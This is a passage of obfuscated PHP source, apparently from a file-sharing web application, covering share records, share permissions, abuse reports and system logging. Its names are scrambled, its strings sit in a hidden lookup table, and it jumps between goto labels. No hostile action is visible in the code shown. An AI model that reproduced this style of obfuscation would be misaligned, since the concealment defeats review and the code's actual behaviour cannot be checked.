($öìË¤Ã[$¨ïğçï[567]] == $¨ïğçï[91] && $°õà­àÇ[$¨ïğçï[567]] == $¨ïğçï[231]) { $ñéÒˆ = $¨ïğçï[2149]; } if ($öìË¤Ã[$¨ïğçï[671]] == $¨ïğçï[231] && $°õà­àÇ[$¨ïğçï[671]] == $¨ïğçï[91]) { $ñéÒˆ = $¨ïğçï[2147]; } if ($öìË¤Ã[$¨ïğçï[671]] == $¨ïğçï[91] && $°õà­àÇ[$¨ïğçï[671]] == $¨ïğçï[231]) { $ñéÒˆ = $¨ïğçï[2150]; } Model($¨ïğçï[641])->eventShare($¶ğ›ÀÔ, $ñéÒˆ); return; } private function _addShareData($àíó…È•, $…œ£½üˆ = array(), $ÁÌ¦ŸÚ = false) { $æÀà¦ó =& $_SERVER[«òÑğ]; $‹”¸¿ˆ  = $ÁÌ¦ŸÚ == $æÀà¦ó[192] ? 0 : USER_ID; $›Š¸Š’ = array($æÀà¦ó[494] => $àíó…È•, $æÀà¦ó[1775] => $‹”¸¿ˆ ); if ($àíó…È• == 0) { $›Š¸Š’ = array($æÀà¦ó[2151] => $…œ£½üˆ[$æÀà¦ó[1267]], $æÀà¦ó[1775] => $‹”¸¿ˆ ); } if ($¤Åô‡á = $this->where($›Š¸Š’)->find()) { return $¤Åô‡á[$æÀà¦ó[673]]; } if ($àíó…È• == 0) { $ÍŒöìÄĞ = array($æÀà¦ó[32] => get_path_this($…œ£½üˆ[$æÀà¦ó[87]])); } else { $ÍŒöìÄĞ = Model($æÀà¦ó[914])->sourceInfo($àíó…È•); if (!$ÍŒöìÄĞ) { return !1; } } if (!$…œ£½üˆ[$æÀà¦ó[1671]]) { $…œ£½üˆ[$æÀà¦ó[1671]] = $ÍŒöìÄĞ[$æÀà¦ó[32]]; } $¤ÒÈÚ– = array($æÀà¦ó[1775] => $‹”¸¿ˆ , $æÀà¦ó[494] => $àíó…È•, $æÀà¦ó[1671] => $æÀà¦ó[12], $æÀà¦ó[567] => 0, $æÀà¦ó[671] => 0, $æÀà¦ó[1267] => $æÀà¦ó[12], $æÀà¦ó[385] => $æÀà¦ó[12], $æÀà¦ó[976] => $æÀà¦ó[12], $æÀà¦ó[2152] => 0, $æÀà¦ó[2153] => 0, $æÀà¦ó[845] => 0, $æÀà¦ó[2154] => $æÀà¦ó[12], $æÀà¦ó[2135] => $æÀà¦ó[12]); $ÜĞŠ¹§µ = explode($æÀà¦ó[50], $æÀà¦ó[2155]); foreach ($ÜĞŠ¹§µ as $î³©½û…) { if (!isset($…œ£½üˆ[$î³©½û…])) { continue; } $¤ÒÈÚ–[$î³©½û…] = $…œ£½üˆ[$î³©½û…]; } $©Ö®îÔè = $this->add($¤ÒÈÚ–); $Ş–é¥çÊ = array($æÀà¦ó[2135] => short_id($©Ö®îÔè)); $this->where(array($æÀà¦ó[2156] => $©Ö®îÔè))->save($Ş–é¥çÊ); return $©Ö®îÔè; } private function _shareAuthSet($“ÉØ„½‡, $úÃÒÄÕ) { $æÎë˜ØÀ =& $_SERVER[«òÑğ]; if (!is_array($úÃÒÄÕ)) { return !1; } $ˆä×—ç» = Model($æÎë˜ØÀ[2097]); $ˆä×—ç»->where(array($æÎë˜ØÀ[673] => $“ÉØ„½‡))->delete(); $óö©Šõ = array(); foreach ($úÃÒÄÕ as $§”üƒÄ„) { $ŒĞ¯Ùª¦ = SourceModel::TYPE_USER; if ($§”üƒÄ„[$æÎë˜ØÀ[191]] == SourceModel::TYPE_GROUP) { $ŒĞ¯Ùª¦ = SourceModel::TYPE_GROUP; } $¤©òàÆ¼ = array($æÎë˜ØÀ[673] => $“ÉØ„½‡, $æÎë˜ØÀ[191] => $ŒĞ¯Ùª¦, $æÎë˜ØÀ[574] => intval($§”üƒÄ„[$æÎë˜ØÀ[574]]), $æÎë˜ØÀ[2093] => 0, $æÎë˜ØÀ[2157] => -1); if ($§”üƒÄ„[$æÎë˜ØÀ[2093]]) { $¤©òàÆ¼[$æÎë˜ØÀ[2093]] = $§”üƒÄ„[$æÎë˜ØÀ[2093]]; } else { if ($§”üƒÄ„[$æÎë˜ØÀ[2157]]) { $¤©òàÆ¼[$æÎë˜ØÀ[2157]] = $§”üƒÄ„[$æÎë˜ØÀ[2157]]; } } $óö©Šõ[] = $¤©òàÆ¼; } return $ˆä×—ç»->addAll($óö©Šõ, array(), !0); } public function numViewAdd($ôğ¸ÜÀ) { $‰û“Íîı =& $_SERVER[«òÑğ]; $êîç‚ı = array($‰û“Íîı[2156] => $ôğ¸ÜÀ); $this->where($êîç‚ı)->setAdd($‰û“Íîı[2152]); } public function numDownloadAdd($¼…éãˆ¡) { $øŸ¾âè‡ =& $_SERVER[«òÑğ]; $Àäâ¢íÃ = array($øŸ¾âè‡[2156] => $¼…éãˆ¡); $this->where($Àäâ¢íÃ)->setAdd($øŸ¾âè‡[2153]); } protected function shareEdit($µŠï¡ÃÄ, $ê±ˆ´”‰) { $ûõï»ø½ =& $_SERVER[«òÑğ]; $«ğô„´Ç = $this->getInfo($µŠï¡ÃÄ); if (!$«ğô„´Ç) { return !1; } $this->_checkLinkShare($ê±ˆ´”‰, $«ğô„´Ç); $ğ²¼‚Ÿ’ = array(); $Óıœø¿ô = explode($ûõï»ø½[50], $ûõï»ø½[2158]); foreach ($Óıœø¿ô as $Ñ¶×Îüš) { if (!array_key_exists($Ñ¶×Îüš, $ê±ˆ´”‰)) { continue; } $ğ²¼‚Ÿ’[$Ñ¶×Îüš] = $ê±ˆ´”‰[$Ñ¶×Îüš]; } $this->shareEventAdd($«ğô„´Ç[$ûõï»ø½[194]], $ê±ˆ´”‰, $ûõï»ø½[1954]); $this->where(array($ûõï»ø½[2156] => $µŠï¡ÃÄ))->save($ğ²¼‚Ÿ’); if (isset($ê±ˆ´”‰[$ûõï»ø½[2144]])) { $this->_shareAuthSet($µŠï¡ÃÄ, $ê±ˆ´”‰[$ûõï»ø½[2144]]); } return !0; } private function _checkLinkShare($ƒš­ÃÜ°, $“¨åãÀ) { $Í´ç£Ìç =& $_SERVER[«òÑğ]; if ($ƒš­ÃÜ°[$Í´ç£Ìç[567]] != $Í´ç£Ìç[91]) { return; } $—‡á¶Şı = $“¨åãÀ[$Í´ç£Ìç[90]][$Í´ç£Ìç[194]]; if ($“¨åãÀ[$Í´ç£Ìç[90]][$Í´ç£Ìç[33]] != $Í´ç£Ìç[233]) { $’³¢õì  = $this->_folderReport($—‡á¶Şı); if (!$’³¢õì ) { return; } show_json(LNG($Í´ç£Ìç[2159]) . $Í´ç£Ìç[2160] . $’³¢õì , !1); } $Òö–„Ñ = Model($Í´ç£Ìç[914])->fileInfoGet($“¨åãÀ[$Í´ç£Ìç[90]][$Í´ç£Ìç[194]]); if (!$Òö–„Ñ) { return; } $˜ÈŠ›«ş = $this->shareFileMeta($Òö–„Ñ[$Í´ç£Ìç[546]]); if (isset($˜ÈŠ›«ş[$Í´ç£Ìç[453]]) && $˜ÈŠ›«ş[$Í´ç£Ìç[453]] == $Í´ç£Ìç[91]) { show_json(LNG($Í´ç£Ìç[2161]), !1); } } private function _folderReport($á¡¨Ş’) { $üÇÇİÊß =& $_SERVER[«òÑğ]; $Â¼Î¯¤ = array($üÇÇİÊß[546] => array($üÇÇİÊß[1099], 0), $üÇÇİÊß[834] => 3); $Æ…Â¸ˆÖ = Model($üÇÇİÊß[2162])->where($Â¼Î¯¤)->field($üÇÇİÊß[546])->select(); if (!$Æ…Â¸ˆÖ) { return !1; } $Æ…Â¸ˆÖ = array_to_keyvalue($Æ…Â¸ˆÖ, $üÇÇİÊß[12], $üÇÇİÊß[546]); $äâ—æë = $üÇÇİÊß[50] . $á¡¨Ş’ . $üÇÇİÊß[50]; $Â¼Î¯¤ = array($üÇÇİÊß[546] => array($üÇÇİÊß[7], $Æ…Â¸ˆÖ), $üÇÇİÊß[589] => array($üÇÇİÊß[462], "\x25{$äâ—æë}\45"), $üÇÇİÊß[508] => 0); $äøåŸéì = Model($üÇÇİÊß[914])->where($Â¼Î¯¤)->field($üÇÇİÊß[2163])->find(); if (!$äøåŸéì) { return !1; } $ˆê¨œÛä = substr($äøåŸéì[$üÇÇİÊß[589]], strpos($äøåŸéì[$üÇÇİÊß[589]], $äâ—æë)); $Â¼Î¯¤ = array($üÇÇİÊß[194] => array($üÇÇİÊß[7], trim($ˆê¨œÛä, $üÇÇİÊß[50]))); $¨ç¨§å³ = Model($üÇÇİÊß[914])->where($Â¼Î¯¤)->field($üÇÇİÊß[32])->select(); $‚ÀÁú´ = array_to_keyvalue($¨ç¨§å³, $üÇÇİÊß[12], $üÇÇİÊß[32]); $‚ÀÁú´[] = $äøåŸéì[$üÇÇİÊß[32]]; return implode($üÇÇİÊß[8], $‚ÀÁú´); } protected function remove($’”À¤) { $ÛµŠÅ¦ =& $_SERVER[«òÑğ]; $¢ÕĞ¹§Á = is_array($’”À¤) ? $’”À¤ : array($’”À¤); for ($¢İË¯Û = 0; $¢İË¯Û < count($¢ÕĞ¹§Á); $¢İË¯Û++) { $Ò§¢…Œ­ = $this->getInfo($¢ÕĞ¹§Á[$¢İË¯Û]); if ($Ò§¢…Œ­[$ÛµŠÅ¦[671]] == $ÛµŠÅ¦[91]) { Model($ÛµŠÅ¦[641])->eventShare($Ò§¢…Œ­[$ÛµŠÅ¦[194]], $ÛµŠÅ¦[2150]); } if ($Ò§¢…Œ­[$ÛµŠÅ¦[567]] == $ÛµŠÅ¦[91]) { Model($ÛµŠÅ¦[641])->eventShare($Ò§¢…Œ­[$ÛµŠÅ¦[194]], $ÛµŠÅ¦[2149]); } $this->shareInfoMofify($Ò§¢…Œ­, $ÛµŠÅ¦[2134]); } $‹„Ì®µ´ = array($ÛµŠÅ¦[673] => array($ÛµŠÅ¦[7], $¢ÕĞ¹§Á)); $Ë÷õ·ï = $this->where($‹„Ì®µ´)->delete(); if ($Ë÷õ·ï) { Model($ÛµŠÅ¦[674])->where($‹„Ì®µ´)->delete(); } return $Ë÷õ·ï; } protected function removeBySource($”û½Öø÷) { $¥ÙŒ‹¿ˆ =& $_SERVER[«òÑğ]; $î¨…Œ›Ò = array($¥ÙŒ‹¿ˆ[494] => array($¥ÙŒ‹¿ˆ[495], $”û½Öø÷)); $ıİ’¬­› = $this->field($¥ÙŒ‹¿ˆ[673])->where($î¨…Œ›Ò)->select(); $ôÒª…×á = array_to_keyvalue($ıİ’¬­›, $¥ÙŒ‹¿ˆ[12], $¥ÙŒ‹¿ˆ[673]); if (!$ôÒª…×á) { return; } foreach ($ıİ’¬­› as $¾Äß£À) { $this->shareInfoMofify($¾Äß£À, $¥ÙŒ‹¿ˆ[2134]); } $î¨…Œ›Ò = array($¥ÙŒ‹¿ˆ[2156] => array($¥ÙŒ‹¿ˆ[495], $ôÒª…×á)); $this->where($î¨…Œ›Ò)->delete(); Model($¥ÙŒ‹¿ˆ[674])->where($î¨…Œ›Ò)->delete(); } public function listAll($‹ÓããñÑ) { $¾°§ô…‰ =& $_SERVER[«òÑğ]; $Ò““úˆš = array(); if ($‹ÓããñÑ[$¾°§ô…‰[1784]]) { $Ò““úˆš[$¾°§ô…‰[1784]] = $‹ÓããñÑ[$¾°§ô…‰[1784]]; } if ($‹ÓããñÑ[$¾°§ô…‰[844]]) { $şÔ£Áªø = $‹ÓããñÑ[$¾°§ô…‰[845]] ? $‹ÓããñÑ[$¾°§ô…‰[845]] : strtotime(date($¾°§ô…‰[2164])); $Ò““úˆš[$¾°§ô…‰[234]] = array($¾°§ô…‰[411], array($‹ÓããñÑ[$¾°§ô…‰[844]], $şÔ£Áªø)); } if ($‹ÓããñÑ[$¾°§ô…‰[33]]) { $Ò““úˆš[$‹ÓããñÑ[$¾°§ô…‰[33]]] = 1; } else { $Ò““úˆš[] = array($¾°§ô…‰[567] => array($¾°§ô…‰[1099], 0), $¾°§ô…‰[671] => array($¾°§ô…‰[1099], 0), $¾°§ô…‰[2138] => $¾°§ô…‰[2087]); } if ($‹ÓããñÑ[$¾°§ô…‰[2083]]) { $Ò““úˆš[] = array($¾°§ô…‰[2135] => $‹ÓããñÑ[$¾°§ô…‰[2083]], $¾°§ô…‰[1671] => array($¾°§ô…‰[462], "\x25{$‹ÓããñÑ[$¾°§ô…‰[2083]]}\45"), $¾°§ô…‰[2138] => $¾°§ô…‰[2087]); } $‘İöªáÚ = $this->_makeOrder()->where($Ò““úˆš)->selectPage(20); if (empty($‘İöªáÚ[$¾°§ô…‰[448]])) { return array(); } $this->_listDataApply($‘İöªáÚ[$¾°§ô…‰[448]]); return $‘İöªáÚ; } public function listDataApply($Ü®öú) { $this->_listDataApply($Ü®öú); return $Ü®öú; } private function _listDataApply(&$ØÂ…óİ‡) { $­İ„î¾å =& $_SERVER[«òÑğ]; $¢æãÊö = array_to_keyvalue($ØÂ…óİ‡, $­İ„î¾å[12], $­İ„î¾å[1784]); $ÁàÌ¿É³ = Model($­İ„î¾å[602])->userListInfo(array_unique($¢æãÊö)); $ôªªŸÂ± = array_to_keyvalue($ØÂ…óİ‡, $­İ„î¾å[12], $­İ„î¾å[194]); $ÏÕ…¼ÓÊ = Model($­İ„î¾å[914])->sourceListInfo($ôªªŸÂ±, !0); foreach ($ØÂ…óİ‡ as $ê¢Çü­Ì => &$Íì‹ò…‰) { $Áó›¼„é = $Íì‹ò…‰[$­İ„î¾å[1784]]; $Íì‹ò…‰[$­İ„î¾å[2165]] = $ÁàÌ¿É³[$Áó›¼„é] ? $ÁàÌ¿É³[$Áó›¼„é] : !1; if (!$Íì‹ò…‰[$­İ„î¾å[2165]] || $Íì‹ò…‰[$­İ„î¾å[2165]][$­İ„î¾å[834]] != $­İ„î¾å[91]) { unset($ØÂ…óİ‡[$ê¢Çü­Ì]); continue; } $ÑËšıÑÏ = $Íì‹ò…‰[$­İ„î¾å[194]]; $Íì‹ò…‰[$­İ„î¾å[90]] = $ÏÕ…¼ÓÊ[$ÑËšıÑÏ] ? $ÏÕ…¼ÓÊ[$ÑËšıÑÏ] : !1; if ($Íì‹ò…‰[$­İ„î¾å[90]][$­İ„î¾å[508]] == $­İ„î¾å[91]) { unset($ØÂ…óİ‡[$ê¢Çü­Ì]); } if ($Íì‹ò…‰[$­İ„î¾å[90]] != $­İ„î¾å[231] && !$Íì‹ò…‰[$­İ„î¾å[90]]) { unset($ØÂ…óİ‡[$ê¢Çü­Ì]); } } unset($Íì‹ò…‰); $ØÂ…óİ‡ = array_values($ØÂ…óİ‡); } private function _makeOrder($™¼²Ê¯ = '') { $×åÑÈ×İ =& $_SERVER[«òÑğ]; $íü‰ê©â = array($×åÑÈ×İ[234], $×åÑÈ×İ[845], $×åÑÈ×İ[2152], $×åÑÈ×İ[2153]); $¾óœå¿ = array($×åÑÈ×İ[526] => $×åÑÈ×İ[527], $×åÑÈ×İ[528] => $×åÑÈ×İ[529]); $¸İÇŸ® = Input::get($×åÑÈ×İ[533], $×åÑÈ×İ[7], $×åÑÈ×İ[500], $íü‰ê©â); $ïÚÒÌÁµ = Input::get($×åÑÈ×İ[534], $×åÑÈ×İ[7], $×åÑÈ×İ[2166], array($×åÑÈ×İ[2080], $×åÑÈ×İ[528])); $ïÚÒÌÁµ = $¾óœå¿[$ïÚÒÌÁµ]; $™¼²Ê¯ = $™¼²Ê¯ . "{$¸İÇŸ®}\40{$ïÚÒÌÁµ}"; return $this->order($™¼²Ê¯); } public function reportAdd($‹î‰¦‹Ş) { $—¿áÌÖ =& $_SERVER[«òÑğ]; $±ñÙÕŸ´ = array($—¿áÌÖ[673] => $‹î‰¦‹Ş[$—¿áÌÖ[673]], $—¿áÌÖ[1784] => USER_ID); if (Model($—¿áÌÖ[2162])->where($±ñÙÕŸ´)->find()) { return !1; } $ì–ŠßÓ = array($—¿áÌÖ[673] => $‹î‰¦‹Ş[$—¿áÌÖ[673]], $—¿áÌÖ[1671] => $‹î‰¦‹Ş[$—¿áÌÖ[1671]], $—¿áÌÖ[194] => $‹î‰¦‹Ş[$—¿áÌÖ[194]], $—¿áÌÖ[546] => $‹î‰¦‹Ş[$—¿áÌÖ[546]], $—¿áÌÖ[1784] => USER_ID, $—¿áÌÖ[33] => $‹î‰¦‹Ş[$—¿áÌÖ[33]], $—¿áÌÖ[529] => $‹î‰¦‹Ş[$—¿áÌÖ[529]]); return Model($—¿áÌÖ[2162])->add($ì–ŠßÓ); } public function reportList($ÉñŞ¡É”) { $§°Ôé” =& $_SERVER[«òÑğ]; $¸»ùÅ«Í = array(); if ($ÉñŞ¡É”[$§°Ôé”[844]]) { $€Êå›¸ = $ÉñŞ¡É”[$§°Ôé”[845]] ? $ÉñŞ¡É”[$§°Ôé”[845]] : strtotime(date($§°Ôé”[2164])); $¸»ùÅ«Í[$§°Ôé”[234]] = array($§°Ôé”[411], array($ÉñŞ¡É”[$§°Ôé”[844]], $€Êå›¸)); } if (isset($ÉñŞ¡É”[$§°Ôé”[33]]) && in_array($ÉñŞ¡É”[$§°Ôé”[33]], array($§°Ôé”[91], $§°Ôé”[513], $§°Ôé”[2167], $§°Ôé”[2168], $§°Ôé”[2169]))) { $¸»ùÅ«Í[$§°Ôé”[33]] = $ÉñŞ¡É”[$§°Ôé”[33]]; } if (isset($ÉñŞ¡É”[$§°Ôé”[834]]) && in_array($ÉñŞ¡É”[$§°Ôé”[834]], array($§°Ôé”[231], $§°Ôé”[91], $§°Ôé”[513], $§°Ôé”[2167]))) { $¸»ùÅ«Í[$§°Ôé”[834]] = $ÉñŞ¡É”[$§°Ôé”[834]]; } $‹÷·Ğìï = Input::get($§°Ôé”[534], $§°Ôé”[7], $§°Ôé”[2166], array($§°Ôé”[2080], $§°Ôé”[528])); $¥¯¶¸Ú‹ = array($§°Ôé”[526] => $§°Ôé”[527], $§°Ôé”[528] => $§°Ôé”[529]); $¤¡é§øÊ = $§°Ôé”[2170] . $¥¯¶¸Ú‹[$‹÷·Ğìï]; $¤«ğµ¶Œ = Model($§°Ôé”[2162])->where($¸»ùÅ«Í)->order($¤¡é§øÊ)->selectPage(20); if (empty($¤«ğµ¶Œ[$§°Ôé”[448]])) { return array(); } $Ğ¹€ø = array_to_keyvalue_group($¤«ğµ¶Œ[$§°Ôé”[448]], $§°Ôé”[834], $§°Ôé”[673]); if (!empty($Ğ¹€ø[0])) { $ÉñŞ¡É” = $Ğ¹€ø[0]; $¸»ùÅ«Í = array($§°Ôé”[673] => array($§°Ôé”[7], $ÉñŞ¡É”)); $’¤İû®˜ = $this->where($¸»ùÅ«Í)->field($§°Ôé”[673])->select(); $’¤İû®˜ = array_to_keyvalue($’¤İû®˜, $§°Ôé”[12], $§°Ôé”[673]); $®ğß­´€ = array_diff($ÉñŞ¡É”, $’¤İû®˜); if (!empty($®ğß­´€)) { foreach ($¤«ğµ¶Œ[$§°Ôé”[448]] as $„’Ğş“¹ => $â§Ù”ğ‚) { if (in_array($â§Ù”ğ‚[$§°Ôé”[673]], $®ğß­´€)) { unset($¤«ğµ¶Œ[$§°Ôé”[448]][$„’Ğş“¹]); } } } } $this->_listDataApply($¤«ğµ¶Œ[$§°Ôé”[448]]); return $¤«ğµ¶Œ; } public function reportStatus($ì®Õ³÷) { $ÆÈñÙØ¤ =& $_SERVER[«òÑğ]; $§¿£ÚÙ¾ = array($ÆÈñÙØ¤[478] => $ì®Õ³÷[$ÆÈñÙØ¤[478]]); $ö…–àÑù = Model($ÆÈñÙØ¤[2162])->where($§¿£ÚÙ¾)->field($ÆÈñÙØ¤[2171])->find(); if (!$ö…–àÑù) { return !1; } $¡˜ÃäÍ¡ = array($ÆÈñÙØ¤[834] => $ì®Õ³÷[$ÆÈñÙØ¤[834]]); if ($ì®Õ³÷[$ÆÈñÙØ¤[834]] == $ÆÈñÙØ¤[2167] && $ö…–àÑù[$ÆÈñÙØ¤[834]] == $ÆÈñÙØ¤[2167]) { $¡˜ÃäÍ¡[$ÆÈñÙØ¤[834]] = 0; } $™”¡èá = Model($ÆÈñÙØ¤[2162])->where($§¿£ÚÙ¾)->save($¡˜ÃäÍ¡); if ($ì®Õ³÷[$ÆÈñÙØ¤[834]] == $ÆÈñÙØ¤[513]) { if ($ö…–àÑù[$ÆÈñÙØ¤[546]] != $ÆÈñÙØ¤[231] && $this->shareFileMeta($ö…–àÑù[$ÆÈñÙØ¤[546]])) { $this->shareFileMeta($ö…–àÑù[$ÆÈñÙØ¤[546]], 0); } $this->remove($ö…–àÑù[$ÆÈñÙØ¤[673]]); return !0; } if ($™”¡èá && $ì®Õ³÷[$ÆÈñÙØ¤[834]] == $ÆÈñÙØ¤[2167]) { $–¿Ø“ = $¡˜ÃäÍ¡[$ÆÈñÙØ¤[834]] == $ÆÈñÙØ¤[2167] ? 1 : 0; $this->shareFileMeta($ö…–àÑù[$ÆÈñÙØ¤[546]], $–¿Ø“); $this->removeByFile($ö…–àÑù[$ÆÈñÙØ¤[546]]); } return $™”¡èá; } private function removeByFile($şÃ¢À€) { $„ê— =& $_SERVER[«òÑğ]; $ªçĞùæ = Model($„ê—[914])->where(array($„ê—[546] => $şÃ¢À€))->field($„ê—[194])->select(); $·½Íó›­ = array_to_keyvalue($ªçĞùæ, $„ê—[12], $„ê—[194]); $¯‡ªÉÁá = array($„ê—[194] => array($„ê—[7], $·½Íó›­), $„ê—[567] => 1); $ªçĞùæ = $this->where($¯‡ªÉÁá)->field($„ê—[673])->select(); if (empty($ªçĞùæ)) { return; } $Ôêƒµ™ = array_to_keyvalue($ªçĞùæ, $„ê—[12], $„ê—[673]); $this->remove($Ôêƒµ™); } private function shareFileMeta($™¦ÛÎà, $ñÓ³å½Ş = null) { $¥ÆÖĞ¼¾ =& $_SERVER[«òÑğ]; $Àò÷°˜ï = array($¥ÆÖĞ¼¾[546] => $™¦ÛÎà, $¥ÆÖĞ¼¾[97] => $¥ÆÖĞ¼¾[2172]); if (is_null($ñÓ³å½Ş)) { return Model($¥ÆÖĞ¼¾[2173])->where($Àò÷°˜ï)->find(); } $Àò÷°˜ï[$¥ÆÖĞ¼¾[453]] = $ñÓ³å½Ş; Model($¥ÆÖĞ¼¾[2173])->add($Àò÷°˜ï, array(), !0); } } goto D¬ã¬Ú­¿á; DªéÙ“¼º²: class SystemLogModel extends ModelBase { protected $tableName = "\163\171\163\164\x65\155\137\x6c\157\x67"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\145\124\x69\x6d\145", "\x74\151\155\145", "\x69\156\163\x65\162\x74", "\x66\165\x6e\x63\164\x69\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $úˆ®ª =& $_SERVER[«òÑğ]; return array($úˆ®ª[2361] => LNG($úˆ®ª[2362]), $úˆ®ª[2363] => LNG($úˆ®ª[2364]), $úˆ®ª[1927] => LNG($úˆ®ª[2365]), $úˆ®ª[2366] => LNG($úˆ®ª[2367]), $úˆ®ª[2368] => LNG($úˆ®ª[2369]), $úˆ®ª[2370] => LNG($úˆ®ª[2371]), $úˆ®ª[2372] => LNG($úˆ®ª[2373]), $úˆ®ª[1957] => LNG($úˆ®ª[2373]), $úˆ®ª[1958] => LNG($úˆ®ª[2374]), $úˆ®ª[2375] => LNG($úˆ®ª[2376]), $úˆ®ª[2377] => LNG($úˆ®ª[2378]), $úˆ®ª[2379] => LNG($úˆ®ª[2380]), $úˆ®ª[2381] => LNG($úˆ®ª[2382]), $úˆ®ª[1955] => LNG($úˆ®ª[2383]), $úˆ®ª[2384] => LNG($úˆ®ª[2385]), $úˆ®ª[1962] => LNG($úˆ®ª[2386]), $úˆ®ª[2387] => LNG($úˆ®ª[2388]), $úˆ®ª[2389] => LNG($úˆ®ª[2390]), $úˆ®ª[2391] => LNG($úˆ®ª[2392]), $úˆ®ª[2393] => LNG($úˆ®ª[2394]), $úˆ®ª[1965] => LNG($úˆ®ª[2395]), $úˆ®ª[1966] => LNG($úˆ®ª[2396]), $úˆ®ª[2397] => LNG($úˆ®ª[2398]), $úˆ®ª[2399] => LNG($úˆ®ª[2400]), $úˆ®ª[2401] => LNG($úˆ®ª[2402]), $úˆ®ª[1960] => LNG($úˆ®ª[2403]), $úˆ®ª[2404] => LNG($úˆ®ª[2405]), $úˆ®ª[1959] => LNG($úˆ®ª[2406]), $úˆ®ª[2407] => LNG($úˆ®ª[2408]), $úˆ®ª[2409] => LNG($úˆ®ª[2410]), $úˆ®ª[2411] => LNG($úˆ®ª[2410]), $úˆ®ª[2412] => LNG($úˆ®ª[2413]), $úˆ®ª[2414] => LNG($úˆ®ª[2414]), $úˆ®ª[2415] => LNG($úˆ®ª[1931]), $úˆ®ª[2416] => LNG($úˆ®ª[2417]), $úˆ®ª[2418] => LNG($úˆ®ª[2419]), $úˆ®ª[2420] => LNG($úˆ®ª[2421]), $úˆ®ª[2422] => LNG($úˆ®ª[2423]), $úˆ®ª[2424] => LNG($úˆ®ª[2425]), $úˆ®ª[2426] => LNG($úˆ®ª[2426]), $úˆ®ª[2427] => LNG($úˆ®ª[2428]), $úˆ®ª[2429] => LNG($úˆ®ª[2430]), $úˆ®ª[2431] => LNG($úˆ®ª[2432]), $úˆ®ª[2433] => LNG($úˆ®ª[2434]), $úˆ®ª[2435] => LNG($úˆ®ª[2436]), $úˆ®ª[2437] => LNG($úˆ®ª[2438]), $úˆ®ª[213] => LNG($úˆ®ª[213]), $úˆ®ª[214] => LNG($úˆ®ª[2439]), $úˆ®ª[2440] => LNG($úˆ®ª[2440])); } private function typeFile() { $úœ¦şè‡ =& $_SERVER[«òÑğ]; $Ì ½ĞÆ = array($úœ¦şè‡[1962] => array($úœ¦şè‡[1963]), $úœ¦şè‡[2379] => array($úœ¦şè‡[2441]), $úœ¦şè‡[2381] => array($úœ¦şè‡[2442]), $úœ¦şè‡[1955] => array($úœ¦şè‡[1956], $úœ¦şè‡[2443]), $úœ¦şè‡[2389] => array(), $úœ¦şè‡[2391] => array(), $úœ¦şè‡[2393] => array(), $úœ¦şè‡[1965] => array($úœ¦şè‡[1967]), $úœ¦şè‡[1966] => array($úœ¦şè‡[1967]), $úœ¦şè‡[2397] => array($úœ¦şè‡[2444]), $úœ¦şè‡[2399] => array($úœ¦şè‡[2444]), $úœ¦şè‡[2401] => array($úœ¦şè‡[2445]), $úœ¦şè‡[2387] => array($úœ¦şè‡[2446]), $úœ¦şè‡[1960] => array($úœ¦şè‡[2447]), $úœ¦şè‡[2404] => array($úœ¦şè‡[2448]), $úœ¦şè‡[1959] => array($úœ¦şè‡[1961])); return $Ì ½ĞÆ; } private function typeAll() { $Ë—ú‹º˜ =& $_SERVER[«òÑğ]; $ß„•«äÂ = $this->typeList; $óçÄ€¨‚ = array_filter($this->typeFile()); foreach ($óçÄ€¨‚ as $µ°üˆšÚ => $“ÏÉº¿µ) { $ß„•«äÂ[$“ÏÉº¿µ[0]] = $ß„•«äÂ[$µ°üˆšÚ]; } $ß„•«äÂ[$Ë—ú‹º˜[1967]] = LNG($Ë—ú‹º˜[2449]); $ß„•«äÂ[$Ë—ú‹º˜[2444]] = LNG($Ë—ú‹º˜[2450]); return $ß„•«äÂ; } public function addLog($ÌÅÃàÁÄ, $È£”„³ = array()) { $­ò»–Õ =& $_SERVER[«òÑğ]; if (!isset($this->typeList[$ÌÅÃàÁÄ])) { return; } $ê³©é» = Session::get($­ò»–Õ[2126]); if (!$ê³©é») { $ê³©é» = _get($È£”„³, $­ò»–Õ[1784], 0); } if ($ÌÅÃàÁÄ == $­ò»–Õ[2416] && is_array($È£”„³[$­ò»–Õ[2451]]) && !$È£”„³[$­ò»–Õ[2451]]) { return; } $ŸçĞ¹ìã = get_client_ip(); if (!$È£”„³ || strlen(json_encode($È£”„³)) >= 1024 * 64) { if ($È£”„³ && is_array($È£”„³)) { $È£”„³ = array_intersect_key($È£”„³, array_flip($­ò»–Õ[478], $­ò»–Õ[32])); $È£”„³[$­ò»–Õ[2452]] = $ŸçĞ¹ìã; } else { $È£”„³ = array($­ò»–Õ[2452] => $ŸçĞ¹ìã); } } else { if (is_array($È£”„³)) { $È£”„³[$­ò»–Õ[2452]] = $ŸçĞ¹ìã; } else { $È£”„³ = array($­ò»–Õ[1297] => $È£”„³, $­ò»–Õ[2452] => $ŸçĞ¹ìã); } } $È£”„³ = array($­ò»–Õ[1774] => Session::sign(), $­ò»–Õ[1775] => intval($ê³©é»), $­ò»–Õ[33] => $ÌÅÃàÁÄ, $­ò»–Õ[1777] => json_encode($È£”„³)); return parent::add($È£”„³); } public function remove($šô¦»º™) { $this->where(array($_SERVER[«òÑğ][496] => $šô¦»º™))->delete(); } private function _makeOrder($õßçöô˜ = '') { $œ£Çæ =& $_SERVER[«òÑğ]; $å·³¼Óí = $œ£Çæ[234]; $“½°‹˜ß = array($œ£Çæ[526] => $œ£Çæ[527], $œ£Çæ[528] => $œ£Çæ[529]); $‹áŞÄîğ = Input::get($œ£Çæ[534], $œ£Çæ[7], $œ£Çæ[2166], array($œ£Çæ[2080], $œ£Çæ[528])); $‹áŞÄîğ = $“½°‹˜ß[$‹áŞÄîğ]; $õßçöô˜ = $õßçöô˜ . "{$å·³¼Óí}\40{$‹áŞÄîğ}"; return $this->order($õßçöô˜); } public function get($û¦ëû· = '') { $üÑÏ»ˆ„ =& $_SERVER[«òÑğ]; if (!$û¦ëû·) { show_json(array()); } $Ô¦ï±âŞ = array(); if ($û¦ëû·[$üÑÏ»ˆ„[1784]]) { $Ô¦ï±âŞ[$üÑÏ»ˆ„[1784]] = $û¦ëû·[$üÑÏ»ˆ„[1784]]; } if (isset($û¦ëû·[$üÑÏ»ˆ„[844]])) { $õà­ßâê = $û¦ëû·[$üÑÏ»ˆ„[844]]; $¼ßÄ³¥ä = isset($û¦ëû·[$üÑÏ»ˆ„[845]]) ? $û¦ëû·[$üÑÏ»ˆ„[845]] : time(); 